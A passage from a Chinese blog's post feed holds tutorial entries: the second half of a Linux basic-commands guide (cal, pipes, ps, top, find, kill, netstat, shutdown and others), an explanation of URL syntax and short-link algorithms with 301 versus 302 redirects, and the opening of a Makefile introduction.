class="bash">X当前locale 下的时间描述 (如：23:13:48)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">y年份最后两位数位 (00-99)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">Y年份</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">z +hhmm数字时区(例如，-0400)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">:z +hh:mm数字时区(例如，-04:00)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">::z +hh:mm:ss数字时区(例如，-04:00:00)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">:::z数字时区带有必要的精度 (例如，-04，+05:30)</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">Z按字母表排序的时区缩写 (例如，EDT)</span></span><br></pre></td></tr></table></figure></p><h4 id="19-cal指令"><a href="#19-cal指令" class="headerlink" title="19.cal指令"></a>19.<code>cal</code>指令</h4><p>作用：用来操作日历的</p><h5 id="语法1：-cal-（等价于-cal-l）"><a href="#语法1：-cal-（等价于-cal-l）" class="headerlink" title="语法1：#cal                （等价于#cal    -l）"></a>语法1：#cal                （等价于#cal    -l）</h5><p>直接输出当前月份日历</p><h5 id="语法2：-cal-3"><a href="#语法2：-cal-3" class="headerlink" title="语法2：#cal    -3"></a>语法2：#cal    -3</h5><p>表示输出上一个月+本月+下个月的日历</p><h5 id="语法3：-cal-y-年份"><a href="#语法3：-cal-y-年份" class="headerlink" title="语法3：#cal    -y    年份"></a>语法3：#cal    -y    年份</h5><p>表示输出某一个年份的日历</p><h4 id="20-clear-ctrl-L-指令"><a href="#20-clear-ctrl-L-指令" class="headerlink" title="20.clear  |  (ctrl+L)   指令"></a>20.<code>clear</code>  |  <code>(ctrl+L)</code>   指令</h4><p>作用：清除终端中已经存在的命令和结果（信息）</p><h5 id="语法：-clear-或-快捷键-ctrl-L"><a href="#语法：-clear-或-快捷键-ctrl-L" class="headerlink" title="语法：#clear        或         快捷键 ctrl  +  L"></a>语法：#clear        或         快捷键 ctrl  +  L</h5><p>注意：该命令并不是真的清除了之前的信息，而是把之前的信息都隐藏到了最上面，可以通过滚动条继续查看以前的信息。</p><h4 id="21-管道pipe"><a href="#21-管道pipe" class="headerlink" title="21.管道pipe"></a>21.管道pipe</h4><h5 id="管道符："><a href="#管道符：" class="headerlink" title="管道符：    |"></a>管道符：    |</h5><p>作用：管道一般可以用于“<strong>过滤</strong>”，“特殊”，“扩展处理”</p><h5 id="语法：管道不能单独使用，必须需要配合前面的指令一起使用，起作用主要是辅助作用"><a href="#语法：管道不能单独使用，必须需要配合前面的指令一起使用，起作用主要是辅助作用" class="headerlink" title="语法：管道不能单独使用，必须需要配合前面的指令一起使用，起作用主要是辅助作用"></a>语法：管道不能单独使用，必须需要配合前面的指令一起使用，起作用<strong>主要是辅助作用</strong></h5><p><strong>①过滤</strong>案例（<strong>高频率使用</strong>）：需要通过管道查询出根目录下包含“y”字母的文档名称。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ls| grep y</span></span><br><span class="line"></span><br><span class="line">针对上面这个命令说明：</span><br><span class="line">①以管道作为分界线，前面的命令有个输出，后面需要先输入，然后再过滤，最后再输出，通俗的讲就是管道前面的输出就是后面指令的输入；</span><br><span class="line">②grep指令：主要用于过滤</span><br></pre></td></tr></table></figure><p>②特殊用法案例：通过管道的操作方法来实现<code>less</code>的等价效果（了解）</p><p>之前通过less查看一个文件，可以<code>#less</code> 路径</p><p>现在通过管道还可以这么：<code>#cat 路径|less</code></p><p>③扩展处理：统计某个目录下的文档的总个数？</p><p><strong>答：#ls / | wc -l</strong></p><h4 id="22-hostname指令"><a href="#22-hostname指令" class="headerlink" title="22.hostname指令"></a>22.<code>hostname</code>指令</h4><p>作用：操作服务器的主机名（读取or设置）</p><h5 id="语法1：-hostname"><a href="#语法1：-hostname" class="headerlink" title="语法1：#hostname"></a>语法1：#hostname</h5><p>含义：表示输出完整的主机名</p><p>语法2：#hostname    -f</p><p>含义：表示输出当前主机名中的FQDN（全限定域名）</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/hostname_1.png" alt></p><h4 id="23-id指令"><a href="#23-id指令" class="headerlink" title="23.id指令"></a>23.<code>id</code>指令</h4><p>作用：查看一个用户的一些基本信息（包含用户id，用户组id，附加组id…），该指令如果不指定用户则默认当前用户。</p><h5 id="语法1：-id"><a href="#语法1：-id" class="headerlink" title="语法1：#id"></a>语法1：#id</h5><p>默认显示当前执行该命令的用户的基本信息</p><h5 id="语法2：-id-username"><a href="#语法2：-id-username" class="headerlink" title="语法2：#id    username"></a>语法2：#id    username</h5><p>显示指定账户（username）的基本信息</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/id_1.png" alt></p><p>验证用户信息可通过文件（<code>/etc/passwd</code>）</p><p>验证用户组信息可通过文件（<code>/etv/group</code>）</p><h4 id="24-whoami指令"><a href="#24-whoami指令" class="headerlink" title="24.whoami指令"></a>24.<code>whoami</code>指令</h4><p>作用：“我是谁？”，显示当前登录的用户名，<strong>一般用于shell脚本，用于获取当前操作系统的用户名方便记录日志。</strong></p><h5 id="语法：-whoami"><a href="#语法：-whoami" class="headerlink" title="语法：#whoami"></a>语法：#whoami</h5><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/whoami.png" alt></p><h4 id="25-ps-ef指令"><a href="#25-ps-ef指令" class="headerlink" title="25.ps -ef指令"></a>25.<code>ps -ef</code>指令</h4><p>指令：ps</p><p>作用：用于查看服务器进程信息</p><p>选项含义：</p><p>​    -e：等价于“-A”，表示列出全部的进程</p><p>​    -f：显示全部的列（显示全字段）</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/ps_1.png" alt></p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">各列的含义：</span><br><span class="line"></span><br><span class="line"><span class="built_in">UID</span>：该进程执行的用户<span class="keyword">id</span>；</span><br><span class="line">PID：进程<span class="keyword">id</span>；</span><br><span class="line">PPID：该进程的父级进程<span class="keyword">id</span>，如果一个程序的父级进程找不到，该程序的进程称之为僵尸进程（parent process ID）；</span><br><span class="line">C：Cpu的占用率，其形式是百分数；</span><br><span class="line">STIME：进行的启动时间；</span><br><span class="line">TTY：终端设备，发起该进程的设备识别符号，如果显示“?”则表示该进程并不是由终端设备发起；</span><br><span class="line">TIME：进程的执行时间；</span><br><span class="line"><span class="built_in">CMD</span>：该进程的名称或者对应的路径</span><br></pre></td></tr></table></figure><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/ps_2.png" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/ps_3.png" alt></p><h5 id="ps-ef-grep-“进程名称”"><a href="#ps-ef-grep-“进程名称”" class="headerlink" title="#ps    -ef    |    grep    “进程名称”"></a>#ps    -ef    |    grep    “进程名称”</h5><p>用于查看特定进程的状态</p><h4 id="26-top指令"><a href="#26-top指令" class="headerlink" title="26.top指令"></a>26.<code>top</code>指令</h4><p>作用：查看服务器的进程占用的资源</p><h5 id="语法：进入命令：-top（动态显示）"><a href="#语法：进入命令：-top（动态显示）" class="headerlink" title="语法：进入命令：#top（动态显示）"></a>语法：进入命令：#top（动态显示）</h5><h5 id="退出命令：按下q键"><a href="#退出命令：按下q键" class="headerlink" title="退出命令：按下q键"></a>退出命令：按下q键</h5><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/top_1.png" alt></p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">表头含义：</span><br><span class="line">PID：进程id；</span><br><span class="line">USER：该进程对应的用户；</span><br><span class="line">PR：优先级；</span><br><span class="line">VIRT：虚拟内存；</span><br><span class="line">RES：常驻内存；</span><br><span class="line">SHR：共享内存；</span><br><span class="line">4计算一个进程实际使用的内存 = 常驻内存（RES）- 共享内存（SHR）</span><br><span class="line">S：表示进程的状态status（sleeping，其中S表示睡眠，R表示运行）；</span><br><span class="line"><span class="tag">%<span class="selector-tag">CPU</span></span>：表示CPU的占用百分比；</span><br><span class="line"><span class="tag">%<span class="selector-tag">MEM</span></span>：表示内存的占用百分比；</span><br><span class="line">TIME+：执行的时间；</span><br><span class="line">COMMAND：进程的名称或者路径</span><br></pre></td></tr></table></figure><p>在运行top命令时，可以有如下快捷键：</p><p>M：表示将结果按照内存（MEM）从高到低进行降序排列</p><p>P：表示将结果按照CPU使用率从高到低进行降序排列</p><p>1：当服务器拥有多个CPU的时候可以使用“1”快捷键来切换是否展示显示各个cpu的详细信息</p><h4 id="27-du-sh指令"><a href="#27-du-sh指令" class="headerlink" title="27.du -sh指令"></a>27.<code>du -sh</code>指令</h4><p>作用：查看目录的真实大小</p><h5 id="语法：-du-sh-目录路径"><a href="#语法：-du-sh-目录路径" class="headerlink" title="语法：#du    -sh    目录路径"></a>语法：#du    -sh    目录路径</h5><p>选项含义：</p><p>​        -s：summaries，只显示汇总的大小</p><p>​        -h：表示以高可读性的形式进行显示</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/du_1.png" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/du_2.png" alt></p><h4 id="28-find指令"><a href="#28-find指令" class="headerlink" title="28.find指令"></a>28.<code>find</code>指令</h4><p>作用：用于查找文件（参数贼多，55个）</p><h5 id="语法：-find-路径范围-选项-选项的值"><a href="#语法：-find-路径范围-选项-选项的值" class="headerlink" title="语法：#find    路径范围    选项    选项的值"></a>语法：#find    路径范围    选项    选项的值</h5><p>选项：</p><p>​    -name：按照文件名称进行搜索（支持模糊搜索）</p><p>​    -type：按照文件的类型进行搜索（文件类型：“-”表示文件，在使用find的使用需要用f来替换；“d”表示文件夹）</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/find_1.png" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/find_2.png" alt></p><p>注：*为通配符，匹配所有字符</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/find_3.png" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/find_4.png" alt></p><h4 id="29-service指令"><a href="#29-service指令" class="headerlink" title="29.service指令"></a>29.<code>service</code>指令</h4><p>作用：用于控制一些软件的服务启动、停止、重启</p><h5 id="语法：-service-服务名-start-stop-restart"><a href="#语法：-service-服务名-start-stop-restart" class="headerlink" title="语法：#service    服务名    start/stop/restart"></a>语法：#service    服务名    start/stop/restart</h5><p>例：启动本机安装的Apache，其服务名为httpd</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/service_1.png" alt></p><ul><li>其服务启动规则可自己编写，后续将会专门开一篇讲述</li></ul><h4 id="30-kill指令"><a href="#30-kill指令" class="headerlink" title="30.kill指令"></a>30.<code>kill</code>指令</h4><p>作用：表示杀死进程（当遇到僵尸进程或者处于某些原因需要关闭进程的时候）</p><h5 id="语法：-kill-进程的PID（需要配合ps一起使用）"><a href="#语法：-kill-进程的PID（需要配合ps一起使用）" class="headerlink" title="语法：#kill    进程的PID（需要配合ps一起使用）"></a>语法：#kill    进程的PID（需要配合ps一起使用）</h5><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/kill_1.png" alt></p><p>与kill相似的命令：#killall</p><h5 id="语法：-killall-进程名称"><a href="#语法：-killall-进程名称" class="headerlink" title="语法：#killall    进程名称"></a>语法：#killall    进程名称</h5><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/kill_2.png" alt></p><h4 id="31-ifconfig指令"><a href="#31-ifconfig指令" class="headerlink" title="31.ifconfig指令"></a>31.<code>ifconfig</code>指令</h4><p>作用：用于操作网卡相关的指令</p><p>语法：#ifconfig（获取网卡信息）</p><p>注意该命令在windows环境下为ipconfig</p><p>Eth0表示Linux中的一个网卡，eth0是其名称。Lo（<strong>loop，本地回还网卡，其ip地址一般都是127.0.0.1</strong>）也是一个网卡名称。注意：inet addr就是网卡的ip地址。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/ifconfig_1.png" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/ifconfig_2.png" alt></p><h4 id="32-reboot指令"><a href="#32-reboot指令" class="headerlink" title="32.reboot指令"></a>32.<code>reboot</code>指令</h4><p>作用：重启计算机</p><h5 id="语法1：-reboot"><a href="#语法1：-reboot" class="headerlink" title="语法1：#reboot"></a>语法1：#reboot</h5><p>重启</p><h5 id="语法2：-reboot-w"><a href="#语法2：-reboot-w" class="headerlink" title="语法2：#reboot    -w"></a>语法2：#reboot    -w</h5><p>模拟重启，但是不重启（只写关机与开机的日志信息）</p><h4 id="33-shutdown指令"><a href="#33-shutdown指令" class="headerlink" title="33.shutdown指令"></a>33.<code>shutdown</code>指令</h4><p>作用：关机（慎用）</p><h5 id="语法1：-shutdown-h-now-“关机提示”"><a href="#语法1：-shutdown-h-now-“关机提示”" class="headerlink" title="语法1：#shutdown    -h    now    “关机提示”"></a>语法1：#shutdown    -h    now    “关机提示”</h5><h5 id="shutdown-h-time-14-41-“关机提示”"><a href="#shutdown-h-time-14-41-“关机提示”" class="headerlink" title="#shutdown    -h    time(14:41)    “关机提示”"></a>#shutdown    -h    time(14:41)    “关机提示”</h5><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/shutdown_1.png" alt></p><p>如果想要取消关机计划的话，则可以按照以下方式去尝试：</p><p><strong>①针对于centos7.x之前的版本：ctrl+c</strong></p><p><strong>②针对于centos7.x（包含）之后的版本：#shutdown  -c</strong></p><blockquote><p>除了shutdown关机以外，还有以下几个关机命令</p><p><code>#init    0</code></p><p><code>#halt</code></p><p><code>#poweroff</code></p></blockquote><h4 id="34-uptime指令"><a href="#34-uptime指令" class="headerlink" title="34.uptime指令"></a>34.<code>uptime</code>指令</h4><p>作用：输出计算机的持续在线时间（计算机从开机到现在运行的时间）</p><h5 id="语法：-uptime"><a href="#语法：-uptime" class="headerlink" title="语法：#uptime"></a>语法：#uptime</h5><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/uptime_1.png" alt></p><h4 id="35-uname指令"><a href="#35-uname指令" class="headerlink" title="35.uname指令"></a>35.<code>uname</code>指令</h4><p>作用：获取计算机操作系统的相关信息</p><h5 id="语法1：-uname"><a href="#语法1：-uname" class="headerlink" title="语法1：#uname"></a>语法1：#uname</h5><p>获取操作系统类型</p><h5 id="语法2：-uname-a"><a href="#语法2：-uname-a" class="headerlink" title="语法2：#uname    -a"></a>语法2：#uname    -a</h5><p>-a：表示all，表示获取全部的系统信息（<strong>类型、全部主机名、内核版本、发布时间、开源计划</strong>）</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/uname_1.png" alt></p><h4 id="36-netstat-tnlp指令"><a href="#36-netstat-tnlp指令" class="headerlink" title="36.netstat    -tnlp指令"></a>36.<code>netstat    -tnlp</code>指令</h4><p>作用：查看网络连接状态</p><h5 id="语法：-netstat-tnlp"><a href="#语法：-netstat-tnlp" class="headerlink" title="语法：#netstat    -tnlp"></a>语法：#netstat    -tnlp</h5><p><img src="https://magic-king.net/images/loading.gif" data-original="Linux-Command/netstat_1.png" alt></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">选项说明：</span><br><span class="line">4-t：表示只列出tcp协议的连接；</span><br><span class="line">4-n：表示将地址从字母组合转化成ip地址，将协议转化成端口号来显示；</span><br><span class="line">4-l：表示过滤出“state（状态）”列中其值为LISTEN（监听）的连接；</span><br><span class="line">4-p：表示显示发起连接的进程pid和进程名称；</span><br></pre></td></tr></table></figure><h4 id="37-man指令"><a href="#37-man指令" class="headerlink" title="37.man指令"></a>37.<code>man</code>指令</h4><p>作用：manual，手册（包含了Linux中全部的命令手册，英文）</p><h5 id="语法：-man-命令"><a href="#语法：-man-命令" class="headerlink" title="语法：#man    命令"></a>语法：#man    命令</h5><p>退出按下q键</p><p>例：#man    cp</p><h2 id="编辑器之神——Vim编辑器"><a href="#编辑器之神——Vim编辑器" class="headerlink" title="编辑器之神——Vim编辑器"></a>编辑器之神——Vim编辑器</h2>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>url</title>
      <link href="/2019/08/19/url/"/>
      <url>/2019/08/19/url/</url>
      
        <content type="html"><![CDATA[<h1 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h1><blockquote><p>引用：</p><p><a href="[https://zh.wikipedia.org/wiki/%E7%BB%9F%E4%B8%80%E8%B5%84%E6%BA%90%E5%AE%9A%E4%BD%8D%E7%AC%A6](https://zh.wikipedia.org/wiki/统一资源定位符">url_Wiki</a>)</p><p><a href="https://blog.csdn.net/zl1zl2zl3/article/details/84712511" target="_blank" rel="noopener">短链接原理分析</a></p><p><a href="https://blog.csdn.net/u011944141/article/details/88646552" target="_blank" rel="noopener">短链接的算法</a></p></blockquote><h2 id="统一资源定位符（英语：Uniform-Resource-Locator）"><a href="#统一资源定位符（英语：Uniform-Resource-Locator）" class="headerlink" title="统一资源定位符（英语：Uniform Resource Locator）"></a>统一资源定位符（英语：<strong>U</strong>niform <strong>R</strong>esource <strong>L</strong>ocator）</h2><p><strong>统一资源定位符</strong>（英语：<strong>U</strong>niform <strong>R</strong>esource <strong>L</strong>ocator，缩写：<strong>URL</strong>；或称<strong>统一资源定位器</strong>、<strong>定位地址</strong>、<strong>URL地址</strong>，俗称<strong>网页地址</strong>或简称<strong>网址</strong>）是因特网上标准的资源的地址（Address），如同在网络上的门牌。它最初是由蒂姆·伯纳斯-李发明用来作为万维网的地址，现在它已经被[万维网联盟4编制为因特网标准<a href="https://tools.ietf.org/html/rfc1738" target="_blank" rel="noopener">RFC 1738</a>。</p><p>在互联网的历史上，统一资源定位符的发明是一个非常基础的步骤。统一资源定位符的语法是一般的，可扩展的，它使用<a href="https://zh.wikipedia.org/wiki/美国信息交换标准代码" target="_blank" rel="noopener">美国信息交换标准代码</a>的一部分来表示因特网的地址。统一资源定位符的开始，一般会标志着一个计算机网络所使用的网络协议。</p><p>统一资源定位符的标准格式如下：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[协议类型]: <span class="regexp">//</span>服务器地址<span class="symbol">:</span>端口号/资源层级UNIX文件路径文件名?查询<span class="comment">#片段ID</span></span><br><span class="line">[protocol]<span class="symbol">://server_address</span><span class="symbol">:port/path_and_filename?search</span><span class="comment">#fragmentID</span></span><br></pre></td></tr></table></figure><p>统一资源定位符的完整格式如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">协议类型</span>]: <span class="link">//访问资源需要的凭证信息@服务器地址:端口号/资源层级UNIX文件路径文件名?查询#片段ID</span></span><br></pre></td></tr></table></figure><p>其中[访问凭证信息]、[端口号]、[查询]、[片段ID]都属于选填项。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>超文本传输协议（http）的统一资源定位符将从因特网获取信息的五个基本元素包括在一个简单的地址中：</p><ol><li>传送协议。</li><li>层级URL标记符号(为[//],固定不变)</li><li>访问资源需要的凭证信息（可省略）</li><li>服务器。（通常为域名，有时为IP地址）</li><li>端口号。（以数字方式表示，若为默认值可省略）</li><li>路径。（以“/”字符区别路径中的每一个目录名称）</li><li>查询。（GET模式的窗体参数，以“?”字符为起点，每个参数以“&amp;”隔开，再以“=”分开参数名称与数据，通常以UTF8的URL编码，避开字符冲突的问题）</li><li>片段。以“#”字符为起点</li></ol><p>以<em><a href="http://zh.wikipedia.org:80/w/index.php?title=Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2" target="_blank" rel="noopener">http://zh.wikipedia.org:80/w/index.php?title=Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2</a></em> 为例, 其中：</p><ol><li><strong>http</strong>，是协议；</li><li><strong>zh.wikipedia.org</strong>，是服务器；</li><li><strong>80</strong>，是服务器上的网络端口号；</li><li><strong>/w/index.php</strong>，是路径；</li><li><strong>?title=Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2</strong>，是询问。</li></ol><p>大多数网页浏览器不要求用户输入网页中“<strong>http://</strong>”的部分，因为绝大多数网页内容是超文本传输协议文件。同样，“<strong>80</strong>”是超文本传输协议文件的常用端口号，因此一般也不必写明。一般来说用户只要键入统一资源定位符的一部分（<strong>zh.wikipedia.org/wiki/Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2</strong>）就可以了。</p><p>由于超文本传输协议允许服务器将浏览器重定向到另一个网页地址，因此许多服务器允许用户省略网页地址中的部分，比如 <strong>www</strong>。从技术上来说这样省略后的网页地址实际上是一个不同的网页地址，浏览器本身无法决定这个新地址是否通，服务器必须完成重定向的任务</p><h2 id="短链接"><a href="#短链接" class="headerlink" title="短链接"></a>短链接</h2><p>短链接本质上是http协议中的重定向内容，一般为http301和http302</p><p>短链接的优势：简短、美观、便于传播</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>例如短链接 <a href="http://qnr.io/j6Dcss" target="_blank" rel="noopener">http://qnr.io/j6Dcss</a></p><p><img src="https://magic-king.net/images/loading.gif" data-original="url/url_example.png" alt="url_example"></p><ol><li>DNS解析qnr.io域名，发送GET请求 /j6Dcss</li><li>服务器会通过短码获取对应的原URL</li><li>然后通过 HTTP 302 （或HTTP 301）转到对应的原URL</li></ol><h3 id="常见算法实现"><a href="#常见算法实现" class="headerlink" title="常见算法实现"></a>常见算法实现</h3><h4 id="自增序列算法"><a href="#自增序列算法" class="headerlink" title="自增序列算法"></a>自增序列算法</h4><p>短址的长度一般设为 6 位，而每一位是由 [a - z, A - Z, 0 - 9] 总共 62 个字母组成的，所以 6 位的话，总共会有 62^6 ~= 568亿种组合，一般肯定是够用了。<br>将原网址分配一个从1位到6位的随机短码，存数据库记录，对返回的id进行62进制转码。</p><p>即可使用发号策略。发号策略是这样的，当一个新的链接过来时，发号器发一个号与之对应。往后只要有新链接过来，发号器不停发号就好。举个例子，第一个进来的链接发号器发0号，对应的短链接为 xx.xxx/0，第二个进来的链接发号器发1号，对应的短链接为 xx.xxx/1，以此类推。<br>发号器发出的10进制号需要转换成62进制，这样可以大大缩短号码转换成字符串后的长度。比如发号器发出 10,000,000,000 这个号码，如果不转换成62进制，直接拼接在域名后面，得到这样一个链接 xx.xxx/10000000000。将上面的号码转换成62进制，结果为AOYKUa，长度只有6位，拼接得到的链接为 xx.xxx/AOYKUa。可以看得出，进制转换后得到的短链接长度变短了一些。6位62进制数，对应的号码空间为626，约等于568亿。也就是说发号器可以发568亿个号，这个号码空间应该能够满足多数项目的需求了，所以基本上不用担心发号器无号可发的情况。上述是发号策略压缩URL的原理，在实际写代码的过程中还需要考虑很多细节，比如缓存，存储等。</p><h4 id="摘要算法"><a href="#摘要算法" class="headerlink" title="摘要算法"></a>摘要算法</h4><p>将原网址 md5 生成 32 位签名串,分为 4 段, 每段 8 个字节<br>对这四段循环处理, 取 8 个字节, 将他看成 16 进制串与0x3fffffff(30位1) 与操作, 即超过 30 位的忽略处理 这 30 位分成 6 段, 每 5位的数字作为字母表的索引取得特定字符, 依次进行获得 6 位字符串<br>总的 md5 串可以获得 4 个 6位串,取里面的任意一个就可作为这个长 url 的短 url 地址 这种算法,虽然会生成4个,但是仍然存在重复几率</p><h4 id="算法比较"><a href="#算法比较" class="headerlink" title="算法比较"></a>算法比较</h4><p>第一种算法的好处就是简单好理解，永不重复。但是短码的长度不固定，随着 id 变大从一位长度开始递增。如果非要让短码长度固定也可以就是让 id 从指定的数字开始递增就可以了。</p><p>第二种算法，虽然几率很小，但是存在碰撞（重复）的可能性。短码位数是比较固定的。</p><h3 id="Q：同一长链接，每次转成的短链接是否一样"><a href="#Q：同一长链接，每次转成的短链接是否一样" class="headerlink" title="Q：同一长链接，每次转成的短链接是否一样"></a>Q：同一长链接，每次转成的短链接是否一样</h3><p>A：同一长链接，每次转成的短链接不一定一样，原因在于如果查询缓存时，如果未命中，发号器会发新号给这个链接。需要说明的是，缓存应该缓存经常转换的热门链接，假设设定缓存过期时间为一小时，如果某个链接很活跃的话，缓存查询命中后，缓存会刷新这个链接的存活时间，重新计时，这个链接就会长久存在缓存中。对于一些生僻链接，从存入缓存开始，在存活时间内很可能不会被再次访问，存活时间结束缓存会删除记录。下一次转换这个生僻链接，缓存不命中，发号器会重新发号。这样一来会导致一条长链接对应多条短链接的情况出现，不仅浪费存储空间，又浪费发号器资源。那么是否有办法解决这个问题呢？是不是可以考虑建立一个长链接-短链接的key-value表，将所有的长链接和对应的短链接都存入其中，这样一来就实现了长短链接一一对应的了。但是想法是美好的，现实是不行的，原因在于，将所有的长链接-短链接对存入这样的表中，本身就需要耗费大量的存储空间，相对于生僻链接可能会对应多条短链接浪费的那点空间，这样做显然就得不偿失了。</p><h3 id="HTTP-301与-302的区别"><a href="#HTTP-301与-302的区别" class="headerlink" title="HTTP 301与 302的区别"></a>HTTP 301与 302的区别</h3><p>301 是永久重定向，302 是临时重定向。短地址一经生成就不会变化，所以用 301 是符合 http 语义的。同时对服务器压力也会有一定减少。用户第一次访问某个短链接后，如果服务器返回301状态码，则这个用户在后续多次访问统一短链接，浏览器会直接请求跳转地址，而不是短链接地址，这样一来服务器端就无法收到用户的请求。如果服务器返回302状态码，且告知浏览器不缓存短链接请求，那么用户每次访问短链接，都会先去短链接服务端取回长链接地址，然后在跳转。从语义上来说，301跳转更为合适，因为是永久跳转，不会每次都访问服务端，还可以减小服务端压力。但如果使用301跳转，服务端就无法精确搜集用户的访问行为了。相反302跳转会导致服务端压力增大，但服务端此时就可精确搜集用户的访问行为。<br>但是如果使用了 301，我们就无法统计到短地址被点击的次数了。而点收集击次数的意义那就不言而喻了，关键是现在服务器硬件设备都很好，还有支持高并发的NGINX，所以对服务器的压力几乎可以忽略，最终也就选择302。</p>]]></content>
      
      
      
        <tags>
            
            <tag> url </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile</title>
      <link href="/2019/06/06/Makefile/"/>
      <url>/2019/06/06/Makefile/</url>
      
        <content type="html"><![CDATA[<h1 id="Make"><a href="#Make" class="headerlink" title="Make"></a><center>Make</center></h1><blockquote><p>本文参考：</p><p><a href="&quot;/Makefile/《GNU+make中文手册-v3.80》.pdf&quot;">GNU+make中文手册</a></p><p><a href="/Makefile/make">GNU+make原版官方手册</a></p><p><a href="https://zh.wikipedia.org/wiki/Make" target="_blank" rel="noopener">make wiki</a></p><p><a href="https://zhuanlan.zhihu.com/p/47390641" target="_blank" rel="noopener">Makefile由浅入深</a></p><p><a href="https://seisman.github.io/how-to-write-makefile/index.html" target="_blank" rel="noopener">跟我一起写Makefile</a></p></blockquote><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>​        最初了解到Makefile，还是从很久很久以前说起。当时在老师底下做项目，要配置一个nginx服务器，当初给出教程是直接<code>make&amp;&amp;make install</code>就完事了，打完代码一行行执行下来看起来非常有成就感233333</p><p>​        但是之后在做计算机系统的实验时，才发现Makefile是如此的有用万能，无论是windows还是linux(ubuntu 16.04)下，只需要一个make就能解决编译链接安装问题，make完就能立即使用，实属好用。在之后的操作系统实验中，真正接触到了Makefile这东西，基本每个实验都要写Makefile，因此对Makefile的格式有了一个大概印象，但不过想深入了解一波，便去找了许多资料看。</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在软件开发中，<strong>make</strong>是一个工具程序（Utility software），经由读取叫做“makefile”的文件，自动化建构软件。它是一种转化文件形式的工具，转换的目标称为“target”；与此同时，它也检查文件的依赖关系，如果需要的话，它会调用一些外部软件来完成任务。它的依赖关系检查系统非常简单，主要根据依赖文件的修改时间进行判断。大多数情况下，它被用来编译源代码，生成结果代码，然后把结果代码连接起来生成<strong>可执行文件</strong>或者<strong>库文件</strong>。它使用叫做“makefile”的文件来确定一个target文件的依赖关系，然后把生成这个target的相关命令传给shell去执行。</p><p>许多现代软件的开发中（如<a href="https://zh.wikipedia.org/wiki/Microsoft_Visual_Studio" target="_blank" rel="noopener">Microsoft Visual Studio</a>（他其实有提供一个vs 2017 交叉工具命令提示符，可以进行make，但不过一般在IDE中直接编译生成独有的工程配置文件）），集成开发环境已经取代make，但是在Unix环境中，仍然有许多任务程师采用make来协助软件开发。</p><h2 id="Makefile介绍"><a href="#Makefile介绍" class="headerlink" title="Makefile介绍"></a>Makefile介绍</h2><p>make命令执行时，需要一个makefile文件，以告诉make命令需要怎么样的去编译和链接程序。</p><p>首先，我们用一个示例来说明makefile的书写规则，以便给大家一个感性认识。这个示例来源于gnu 的make使用手册，在这个示例中，我们的工程有8个c文件，和3个头文件，我们要写一个makefile来告 